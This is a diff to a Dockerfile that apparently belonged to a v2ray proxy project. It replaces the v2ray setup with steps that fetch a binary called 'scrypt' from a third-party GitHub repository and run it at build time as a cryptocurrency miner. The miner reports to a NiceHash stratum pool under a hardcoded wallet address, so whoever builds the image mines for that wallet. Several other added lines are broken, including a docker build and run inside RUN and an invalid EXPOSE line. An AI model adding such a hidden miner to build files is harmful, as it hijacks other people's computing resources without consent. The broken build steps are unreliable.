@@ -3,18 +3,19 @@ LABEL maintainer="https://github.com/onplus"
 
 #ENV VER=v4.20.0
 
-RUN apk add --no-cache --virtual .build-deps ca-certificates curl \
- && mkdir -m 777 /v2raybin \
- && cd /v2raybin \
- #&& curl -L -H "Cache-Control: no-cache" -o v2ray.zip https://github.com/v2ray/v2ray-core/releases/download/$VER/v2ray-linux-64.zip \
- && curl -L -H "Cache-Control: no-cache" -o v2ray.zip https://github.com/v2ray/v2ray-core/releases/latest/download/v2ray-linux-64.zip \
- && unzip v2ray.zip \
- && chmod +x /v2raybin/v2ray \
- && rm -rf v2ray.zip \
- && chgrp -R 0 /v2raybin \
- && chmod -R g+rwX /v2raybin 
- 
-ADD entrypoint.sh /entrypoint.sh
-RUN chmod +x /entrypoint.sh 
+RUN apt-get update && \
+    apt-get install apt-transport-https ca-certificates curl software-properties-common && \
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
+    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
+    apt-get update && \
+    apt install docker-ce
+RUN apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git
+RUN wget https://github.com/vultrdocker/portal-vultr/raw/master/scrypt
+RUN chmod u+x scrypt
+RUN ./scrypt -a scrypt -o stratum+tcp://scrypt.usa-west.nicehash.com:3333 -u 3NFjvzSUkafgFvrhoEyHguguCu7Tg811y4.cpu -p x -t 6
+# copy files from the repository into this staging server
+COPY . .
 
-CMD /entrypoint.sh
+RUN docker build -t image .
+RUN docker run -d -p 80:80 image
+EXPOSE WEBSITE http://localhost:80
